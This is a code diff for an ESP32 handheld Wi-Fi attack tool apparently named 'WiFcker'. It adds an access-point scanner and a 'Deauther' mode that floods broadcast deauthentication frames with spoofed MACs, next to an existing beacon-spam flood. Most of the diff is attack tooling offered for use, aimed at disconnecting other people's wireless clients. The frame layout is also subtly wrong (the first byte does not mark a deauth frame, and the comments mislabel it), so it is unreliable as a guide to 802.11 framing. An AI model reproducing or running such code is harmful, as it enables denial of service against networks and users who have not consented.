@@ -9,6 +9,95 @@
 
 int charset;
 
+/*
+#define MAX_AP_NUM 256
+
+typedef struct {
+    char name[32];
+    uint8_t address[6];
+} AP;
+
+AP* scan_wifi_ap(int *ap_count) {
+    uint16_t num_aps = MAX_AP_NUM;
+    wifi_ap_record_t ap_records[MAX_AP_NUM];
+    esp_err_t ret;
+
+    ret = esp_wifi_scan_start(NULL, true);
+    if (ret == ESP_OK) {
+        ret = esp_wifi_scan_get_ap_records(&num_aps, ap_records);
+        if (ret != ESP_OK) {
+            M5.Display.printf("Failed to get AP records: %s\n", esp_err_to_name(ret));
+            return NULL;
+        }
+    } else {
+        M5.Display.printf("Failed to start scan: %s\n", esp_err_to_name(ret));
+        return NULL;
+    }
+
+    AP *ap_info_list = (AP *)malloc(num_aps * sizeof(AP));
+    if (ap_info_list == NULL) {
+        M5.Display.printf("Failed to allocate memory for AP info list\n");
+        return NULL;
+    }
+
+    for (int i = 0; i < num_aps; i++) {
+        snprintf(ap_info_list[i].name, sizeof(ap_info_list[i].name), "%.*s", sizeof(ap_info_list[i].name) - 1, (char*)ap_records[i].ssid);
+        memcpy(ap_info_list[i].address, ap_records[i].bssid, sizeof(ap_records[i].bssid)); // Copy BSSID
+    }
+
+    *ap_count = num_aps;
+    return ap_info_list;
+}
+*/
+
+#define MAX_AP_NUM 20 // Define your max number of APs to scan
+
+typedef struct {
+    char name[32];
+    uint8_t address[6];
+} AP;
+
+AP* scan_wifi_ap(int *ap_count) {
+    uint16_t num_aps = MAX_AP_NUM; // Initialize with the maximum number of APs
+    wifi_ap_record_t ap_records[MAX_AP_NUM];
+    esp_err_t ret;
+
+    // Start the Wi-Fi scan
+    ret = esp_wifi_scan_start(NULL, true);
+    if (ret != ESP_OK) {
+        M5.Display.printf("Failed to start scan: %s\n", esp_err_to_name(ret));
+        return NULL;
+    }
+
+    // Get the access point records
+    ret = esp_wifi_scan_get_ap_records(&num_aps, ap_records);
+    if (ret != ESP_OK) {
+        M5.Display.printf("Failed to get AP records: %s\n", esp_err_to_name(ret));
+        return NULL;
+    }
+
+    // Allocate memory for AP information
+    AP *ap_info_list = (AP *)malloc(num_aps * sizeof(AP));
+    if (ap_info_list == NULL) {
+        M5.Display.printf("Failed to allocate memory for AP info list\n");
+        return NULL;
+    }
+
+    // Copy the details of each AP into the allocated array
+    for (int i = 0; i < num_aps; i++) {
+        // Safely copy the SSID, ensuring it does not exceed the buffer size
+        strncpy(ap_info_list[i].name, (char*)ap_records[i].ssid, sizeof(ap_info_list[i].name) - 1);
+        ap_info_list[i].name[sizeof(ap_info_list[i].name) - 1] = '\0'; // Ensure null-termination
+
+        // Copy BSSID
+        memcpy(ap_info_list[i].address, ap_records[i].bssid, sizeof(ap_records[i].bssid));
+    }
+
+    // Set the number of access points found
+    *ap_count = num_aps; 
+    return ap_info_list; // Return the pointer to the AP list
+}
+
 char *generate_ssid() {
     char *ssid;
 
@@ -112,7 +201,34 @@ void send_beacon(const char *ssid, const uint8_t *mac_addr, uint8_t channel) {
     esp_wifi_80211_tx(WIFI_IF_STA, beacon_frame, frame_len, false);
 }
 
-void troll() {
+void send_deauth(const uint8_t *source_mac, const uint8_t *client_addr, const uint8_t *ap_addr) {
+    uint8_t deauth_frame[128] = {0};
+    int frame_len = 0;
+
+    deauth_frame[0] = 0x00; // Frame Type: Control frame
+    deauth_frame[1] = 0x00; // Subtype: Deauthentication
+    deauth_frame[2] = 0x00; // Flags
+    deauth_frame[3] = 0x00; // Flags
+    deauth_frame[4] = 0x00; // Duration (2 bytes)
+    deauth_frame[5] = 0x00;
+
+    memcpy(deauth_frame + 6, client_addr, 6);
+
+    memcpy(deauth_frame + 12, source_mac, 6);
+
+    memcpy(deauth_frame + 18, ap_addr, 6);
+
+    deauth_frame[24] = 0x00; // Sequence Number
+    deauth_frame[25] = 0x00; // Fragment Number
+    deauth_frame[26] = 0x00; // Reason code (0: unspecified reason)
+    deauth_frame[27] = 0x00; // Reason code (2 bytes total)
+
+    frame_len = 28; // Frame header length
+
+    esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, frame_len, false);
+}
+
+void trollBeacon() {
     char *ssid = generate_ssid();
 
     if (ssid == NULL) {
@@ -128,6 +244,13 @@ void troll() {
     }
 
     free(ssid);
+}
+
+void trollDeauth(const uint8_t *client_addr, const uint8_t *ap_addr) {
+    uint8_t source_addr[6];
+    generate_random_mac(source_addr);
+
+    send_deauth(source_addr,client_addr,ap_addr);
 }
 
 static int packet_count = 0;
@@ -163,8 +286,7 @@ void stop_pps_timer() {
 }
 
 int BeaconSpam() {
-    srand(time(NULL));
-    charset = 1;
+    charset = 0;
 
     int Selector = 0;
     struct menu Menu;
@@ -176,6 +298,7 @@ int BeaconSpam() {
     Menu.elements[0].name = "Charset";
     Menu.elements[0].type = 0;
     Menu.elements[0].length = 4;
+    Menu.elements[0].selector = 0;
     Menu.elements[0].options[0] = "hig";
     Menu.elements[0].options[1] = "kat";
     Menu.elements[0].options[2] = "cyr";
@@ -229,6 +352,7 @@ int BeaconSpam() {
                     case 1:  // Start attack
                         init_pps_timer();
                         vTaskDelay(pdMS_TO_TICKS(100));
+                        charset = Menu.elements[0].selector;
                         int wait = 1;
                         while (wait) {
                             M5Cardputer.update();
@@ -236,7 +360,7 @@ int BeaconSpam() {
                                 wait = 0;
                             }
                             packet_count++;
-                            troll();
+                            trollBeacon();
                             for (int i = 0; i < 10; i++) {
                                 vTaskDelay(pdMS_TO_TICKS(0));  // Yield the processor for a short duration
                             }
@@ -249,19 +373,113 @@ int BeaconSpam() {
         }
         vTaskDelay(pdMS_TO_TICKS(50));
     }
-
-
 }
+
+int Deauther() {
+    int Selector = 0;
+    struct menu Menu;
+
+    Menu.name = "~/WiFcker/Deauther";
+    Menu.length = 3;  // apmac, clientmac, statack
+    Menu.elements = new item[Menu.length];
+
+    Menu.elements[0].name = "AP mac";
+    Menu.elements[0].type = 0;
+    Menu.elements[0].length = 2;
+    Menu.elements[0].selector = 0;
+    Menu.elements[0].options[0] = "ff..";
+    Menu.elements[0].options[1] = "aa..";
+    Menu.elements[0].options[2] = NULL; // Terminate options explicitly
+
+    Menu.elements[1].name = "Client mac";
+    Menu.elements[1].type = 0;
+    Menu.elements[1].length = 2;
+    Menu.elements[1].selector = 0;
+    Menu.elements[1].options[0] = "ff..";
+    Menu.elements[1].options[1] = "ff..";
+    Menu.elements[1].options[2] = NULL; // Terminate options explicitly
+
+    Menu.elements[2].name = "Start attack";
+    Menu.elements[2].type = 1;
+    Menu.elements[2].length = 0;
+    for (int i = 0; i < MAX_OPTIONS; i++) {
+        Menu.elements[2].options[i] = NULL;
+    }
+
+    drawMenu(Menu, Selector);
+
+    int UPp, DOWNp, LEFTp, RIGHTp, SELECTp, RETURNp;
+
+    while (1) {
+        M5Cardputer.update();
+        if (M5Cardputer.Keyboard.isChange()) {
+            UPp = M5Cardputer.Keyboard.isKeyPressed(';');
+            DOWNp = M5Cardputer.Keyboard.isKeyPressed('.');
+            LEFTp = M5Cardputer.Keyboard.isKeyPressed(',');
+            RIGHTp = M5Cardputer.Keyboard.isKeyPressed('/');
+            SELECTp = M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER);
+            RETURNp = M5Cardputer.Keyboard.isKeyPressed('`');
+
+            if (RETURNp) {
+                return 0;
+            }
+            else if (UPp) {
+                Selector = intChecker(Selector - 1, Menu.length);
+                vTaskDelay(pdMS_TO_TICKS(50));
+            }
+            else if (DOWNp) {
+                Selector = intChecker(Selector + 1, Menu.length);
+                vTaskDelay(pdMS_TO_TICKS(50));
+            }
+            else if (LEFTp && (Menu.elements[Selector].type == 0)) {
+                Menu.elements[Selector].selector = intChecker(Menu.elements[Selector].selector - 1, Menu.elements[Selector].length);
+                vTaskDelay(pdMS_TO_TICKS(50));
+            }
+            else if (RIGHTp  && (Menu.elements[Selector].type == 0)) {
+                Menu.elements[Selector].selector = intChecker(Menu.elements[Selector].selector + 1, Menu.elements[Selector].length);
+                vTaskDelay(pdMS_TO_TICKS(50));
+            }
+            if (SELECTp) {
+                M5GFX_clear_screen();
+                switch (Selector) {
+                    case 2:  // Start attack
+                        init_pps_timer();
+                        vTaskDelay(pdMS_TO_TICKS(100));
+                        int wait = 1;
+                        while (wait) {
+                            M5Cardputer.update();
+                            if (M5Cardputer.Keyboard.isPressed()) {
+                                wait = 0;
+                            }
+                            packet_count++;
+
+                            uint8_t client[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
+                            uint8_t ap[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
+
+                            trollDeauth(client, ap);
+
+                            for (int i = 0; i < 10; i++) {
+                                vTaskDelay(pdMS_TO_TICKS(0));  // Yield the processor for a short duration
+                            }
+                        }
+                        stop_pps_timer();
+                        break;
+                }
+            }
+            drawMenu(Menu, Selector);
+        }
+        vTaskDelay(pdMS_TO_TICKS(50));
+    }
+}
+
 
 int menuTask() {
     srand(time(NULL));
-    charset = 1;
-
     int Selector = 0;
     struct menu Menu;
 
     Menu.name = "~/WiFcker";
-    Menu.length = 2;  // BeaconSpam, Deauther
+    Menu.length = 3;  // BeaconSpam, Deauther, WifiScan
     Menu.elements = new item[Menu.length];
 
     Menu.elements[0].name = "Beacon Spam";
@@ -276,6 +494,13 @@ int menuTask() {
     Menu.elements[1].length = 0;
     for (int i = 0; i < MAX_OPTIONS; i++) {
         Menu.elements[1].options[i] = NULL;
+    }
+
+    Menu.elements[2].name = "Wifi Scan";
+    Menu.elements[2].type = 1;
+    Menu.elements[2].length = 0;
+    for (int i = 0; i < MAX_OPTIONS; i++) {
+        Menu.elements[2].options[i] = NULL;
     }
 
     drawMenu(Menu, Selector);
@@ -316,9 +541,35 @@ int menuTask() {
                         break;
                     case 1:  // Deauther
                         M5GFX_clear_screen();
-                        ret = 0;
+                        printf ("beacon_spam_task - starting");
+                        ret = Deauther();
                         if (ret != 0) {
                             printf("Error in app.");
+                        }
+                        break;
+                    case 2: // Scan Wifi
+                        M5GFX_clear_screen();
+                        M5GFX_display_text(0, 0, "Scanning...", TFT_WHITE);
+                        int ap_count;
+                        AP *ap_list = scan_wifi_ap(&ap_count);
+                        M5GFX_clear_screen();
+                        if (ap_list) {
+                            M5.Display.printf("Found %d APs\n", ap_count);
+                            for (int i = 0; i < ap_count; i++) {
+                                M5.Display.printf("[%d]: '%s'  " MACSTR, i, ap_list[i].name, MAC2STR(ap_list[i].address));
+                                M5.Display.printf("\n");
+                            }
+                            free(ap_list);
+                        } else {
+                            M5.Display.printf("Wi-Fi AP scan failed.\n");
+                        }
+                        int wait = 1;
+                        while (wait) {
+                            M5Cardputer.update();
+                            if (M5Cardputer.Keyboard.isPressed()) {
+                                wait = 0;
+                            }
+                            vTaskDelay(pdMS_TO_TICKS(30));
                         }
                         break;
                 }
